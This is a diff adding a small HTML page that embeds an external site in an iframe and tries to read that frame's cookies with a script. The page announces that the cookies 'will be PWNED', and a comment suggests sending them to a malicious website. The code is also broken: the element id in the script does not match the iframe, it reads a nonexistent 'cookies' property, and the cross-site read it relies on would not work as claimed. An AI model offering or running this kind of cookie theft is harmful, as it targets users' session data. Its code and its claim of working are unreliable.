@@ -1,0 +1,22 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+<title>ICL example.</title>
+</head>
+<body>
+<iframe src="http://denny-0.web.app" id="output_iframe_id"/>
+<p>Once the frame loads, all the cookies on this website will be
+PWNED.</p> 
+<script>
+ var iframe = document.getElementById("output_frame_id");
+  var cookies = iframe.contentWindow.document.cookies;
+  alert(cookies)
+  
+  // Now the cookies element has been defined, you can
+  // send it to a malicious website, store it on a
+  // database and yeah. Treat it like it was your
+  // site and you executing JS.
+</script>
+
+</body>
+</html>
